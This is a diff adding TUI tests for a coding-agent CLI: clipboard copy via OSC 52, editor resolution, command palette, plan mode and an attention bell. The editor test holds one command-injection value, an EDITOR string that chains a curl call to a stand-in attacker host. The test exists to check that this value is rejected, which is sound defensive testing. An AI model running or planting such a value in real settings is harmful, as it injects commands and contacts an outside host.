@@ -168,7 +168,11 @@ test("P0: renderHeader and renderStatus support semantic colors, progress bar, a
       },
     },
   };
-  const state = { runtime: fakeRuntime, subagents: new Map() };
+  const state = {
+    runtime: fakeRuntime,
+    channel: { attach() {} },
+    subagents: new Map(),
+  };
 
   const wideHeader = renderHeader(state, { theme: TAGGED_THEME, width: 120 });
   assert.match(wideHeader, /<b><accent>codepunk<\/accent><\/b>/u);
@@ -652,4 +656,257 @@ test("P0: writeUserTuiPreferences persists valid tui.theme and rejects invalid n
       /tui\.theme/u,
     );
   });
+});
+
+test("Ergonomics: /copy extracts replies and code blocks and supports native + OSC 52 clipboard", async () => {
+  const { parseCopySelector, extractAssistantReplyText, copyTextToClipboard } =
+    await importSource("packages/cli/src/tui/commands/copy.ts");
+
+  assert.deepEqual(parseCopySelector(""), { kind: "reply", index: 1 });
+  assert.deepEqual(parseCopySelector("last"), { kind: "reply", index: 1 });
+  assert.deepEqual(parseCopySelector("2"), { kind: "reply", index: 2 });
+  assert.deepEqual(parseCopySelector("code"), { kind: "code", index: 1 });
+  assert.deepEqual(parseCopySelector("code 2"), { kind: "code", index: 2 });
+  assert.equal(parseCopySelector("0"), null);
+  assert.equal(parseCopySelector("invalid arg"), null);
+
+  const messages = [
+    { role: "user", content: [{ type: "text", text: "hi" }] },
+    {
+      role: "assistant",
+      content: [
+        {
+          type: "text",
+          text: "First reply\n```ts\nconst a = 1;\n```",
+        },
+      ],
+    },
+    {
+      role: "assistant",
+      content: [
+        {
+          type: "text",
+          text: 'Second reply\n```sh\npnpm test\n```\n```json\n{"ok":true}\n```',
+        },
+      ],
+    },
+  ];
+  assert.match(
+    extractAssistantReplyText(messages, { kind: "reply", index: 1 }),
+    /^Second reply/u,
+  );
+  assert.match(
+    extractAssistantReplyText(messages, { kind: "reply", index: 2 }),
+    /^First reply/u,
+  );
+  assert.equal(
+    extractAssistantReplyText(messages, { kind: "code", index: 1 }),
+    '{"ok":true}',
+  );
+  assert.equal(
+    extractAssistantReplyText(messages, { kind: "code", index: 2 }),
+    "pnpm test",
+  );
+  assert.equal(
+    extractAssistantReplyText(messages, { kind: "code", index: 3 }),
+    "const a = 1;",
+  );
+  assert.equal(
+    extractAssistantReplyText(messages, { kind: "code", index: 9 }),
+    null,
+  );
+
+  const nativeCopied = copyTextToClipboard("hello", {
+    platform: "darwin",
+    env: {},
+    execClipboard: (cmd, _args, text) => cmd === "pbcopy" && text === "hello",
+  });
+  assert.deepEqual(nativeCopied, { ok: true, method: "native" });
+
+  let oscSeq = "";
+  const sshOsc = copyTextToClipboard("ssh-text", {
+    platform: "linux",
+    isTTY: true,
+    env: { SSH_TTY: "/dev/pts/0" },
+    execClipboard: () => {
+      throw new Error("native clipboard must not run over SSH");
+    },
+    writeOsc52: (seq) => {
+      oscSeq = seq;
+    },
+  });
+  assert.deepEqual(sshOsc, { ok: true, method: "osc52" });
+  assert.equal(
+    oscSeq,
+    `\u001b]52;c;${Buffer.from("ssh-text").toString("base64")}\u0007`,
+  );
+});
+
+test("Ergonomics: /editor validates $VISUAL/$EDITOR safely and preserves user markdown headings", async () => {
+  const { resolveExternalEditor, buildEditorBuffer, stripEditorComments } =
+    await importSource("packages/cli/src/tui/commands/editor.ts");
+
+  assert.deepEqual(resolveExternalEditor({}), { kind: "builtin" });
+  assert.deepEqual(
+    resolveExternalEditor({ VISUAL: "code --wait", EDITOR: "vim" }),
+    { kind: "external", argv: ["code", "--wait"], raw: "code --wait" },
+  );
+  assert.equal(
+    resolveExternalEditor({ EDITOR: "vim; curl https://evil.test" }).kind,
+    "unsafe",
+  );
+
+  const buf = buildEditorBuffer(
+    "# Refactor Plan\n- Step 1",
+    "Previous reply line",
+  );
+  assert.equal(stripEditorComments(buf), "# Refactor Plan\n- Step 1");
+});
+
+test("Ergonomics: command palette opens inspect overlays directly without session.prompt, /plan handles lifecycle subcommands, and attention bell respects cancel/opt-out", async () => {
+  const { openCommandPalette } = await importSource(
+    "packages/cli/src/tui/commands/palette.ts",
+  );
+  const { planCommand } = await importSource(
+    "packages/cli/src/tui/commands/project.ts",
+  );
+  const { startAttentionBellTimer } = await importSource(
+    "packages/cli/src/tui/approval/attention-bell.ts",
+  );
+
+  let promptCalled = false;
+  let customCalls = 0;
+  let modeState = { mode: "off", plan_sha256: null };
+  const fakeRuntime = {
+    session: { sessionId: "01ERGONOMICS", allEvents: [] },
+    paths: { deliveryRoot: "/workspace/demo", home: "/tmp/cp-home" },
+    config: {
+      model: { provider: "openai", id: "gpt-5" },
+      approval: { mode: "ask", reviewer: { mode: "off", timeout_ms: 5000 } },
+      autonomy: { profile: "ask" },
+      sandbox: { mode: "required", network_allow: [], network_deny: [] },
+      filesystem: { mode: "workspace" },
+      budget: { max_tokens: null, max_cost_usd: null },
+      tui: { theme: "codepunk", statusline: ["policy"], widgets: false },
+    },
+    workspaceTrust: {
+      trusted: true,
+      mode: "all",
+      source: "saved",
+      savedPath: "/tmp/trust.json",
+      available: ["config"],
+      grants: { config: true, policy: true, skills: true, instructions: true },
+    },
+    sandbox: { sandboxed: true },
+    shellPreflightIssue: null,
+    mcpStatus: "ready",
+    mcpServers: [],
+    ledger: { all: [], head: null },
+    planMode: {
+      state: () => modeState,
+      async enter() {
+        modeState = { mode: "planning", plan_sha256: null };
+        return modeState;
+      },
+      async approve() {
+        modeState = { mode: "approved", plan_sha256: "sha256:1234" };
+        return modeState;
+      },
+      async exit() {
+        modeState = { mode: "off", plan_sha256: null };
+        return modeState;
+      },
+    },
+    usage: () => ({ totalTokens: 0, costUsd: 0, calls: 0 }),
+    host: {
+      session: {
+        model: { provider: "openai", id: "gpt-5" },
+        messages: [],
+        getContextUsage: () => ({
+          tokens: 100,
+          contextWindow: 1000,
+          percent: 10,
+        }),
+        async prompt() {
+          promptCalled = true;
+        },
+      },
+    },
+  };
+  const state = {
+    runtime: fakeRuntime,
+    channel: { attach() {} },
+    subagents: new Map(),
+  };
+  const notices = [];
+  const context = {
+    ui: {
+      async custom(factory) {
+        customCalls += 1;
+        if (customCalls === 1) {
+          return "inspect:evidence";
+        }
+        let closed = false;
+        factory(
+          { stop() {}, start() {}, requestRender() {} },
+          THEME,
+          KEYBINDINGS,
+          () => {
+            closed = true;
+          },
+        );
+        assert.equal(closed, false);
+        return undefined;
+      },
+      notify(message, level) {
+        notices.push({ message, level });
+      },
+      setStatus() {},
+      setWidget() {},
+    },
+  };
+
+  await openCommandPalette(state, context);
+  assert.equal(customCalls, 2);
+  assert.equal(promptCalled, false);
+
+  const plan = planCommand(state);
+  await plan.handler("on", context);
+  assert.equal(modeState.mode, "planning");
+  await plan.handler("approve", context);
+  assert.equal(modeState.mode, "approved");
+  await plan.handler("off", context);
+  assert.equal(modeState.mode, "off");
+  assert.equal(promptCalled, false);
+
+  const bells = [];
+  const stopFast = startAttentionBellTimer({
+    delayMs: 50,
+    isTTY: true,
+    env: {},
+    write: (chunk) => bells.push(chunk),
+  });
+  stopFast();
+  await new Promise((resolve) => setTimeout(resolve, 70));
+  assert.equal(bells.length, 0);
+
+  const stopSlow = startAttentionBellTimer({
+    delayMs: 50,
+    isTTY: true,
+    env: {},
+    write: (chunk) => bells.push(chunk),
+  });
+  await new Promise((resolve) => setTimeout(resolve, 75));
+  stopSlow();
+  assert.deepEqual(bells, ["\u0007"]);
+
+  const disabledBells = [];
+  startAttentionBellTimer({
+    delayMs: 50,
+    isTTY: true,
+    env: { CODEPUNK_NO_BELL: "1" },
+    write: (chunk) => disabledBells.push(chunk),
+  });
+  await new Promise((resolve) => setTimeout(resolve, 70));
+  assert.equal(disabledBells.length, 0);
 });
